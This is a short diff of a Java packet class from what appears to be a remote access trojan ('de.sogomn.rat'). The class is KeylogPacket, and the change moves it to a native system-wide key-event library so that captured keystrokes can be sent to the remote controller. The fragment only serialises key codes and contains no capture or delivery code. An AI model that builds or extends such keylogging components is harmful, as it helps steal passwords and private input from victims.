@@ -1,34 +1,38 @@
 package de.sogomn.rat.packet;
 
-import java.awt.event.KeyEvent;
+import org.jnativehook.keyboard.NativeKeyEvent;
 
 import de.sogomn.rat.ActiveConnection;
 
 public final class KeylogPacket implements IPacket {
 	
-	private int key;
+	private int keyCode;
 	
-	public KeylogPacket(final int key) {
-		this.key = key;
+	public KeylogPacket(final int keyCode) {
+		this.keyCode = keyCode;
 	}
 	
 	public KeylogPacket() {
-		this(KeyEvent.VK_UNDEFINED);
+		this(NativeKeyEvent.VC_UNDEFINED);
 	}
 	
 	@Override
 	public void send(final ActiveConnection connection) {
-		connection.writeInt(key);
+		connection.writeInt(keyCode);
 	}
 	
 	@Override
 	public void receive(final ActiveConnection connection) {
-		key = connection.readInt();
+		keyCode = connection.readInt();
 	}
 	
 	@Override
 	public void execute(final ActiveConnection connection) {
 		//...
+	}
+	
+	public int getKeyCode() {
+		return keyCode;
 	}
 	
 }
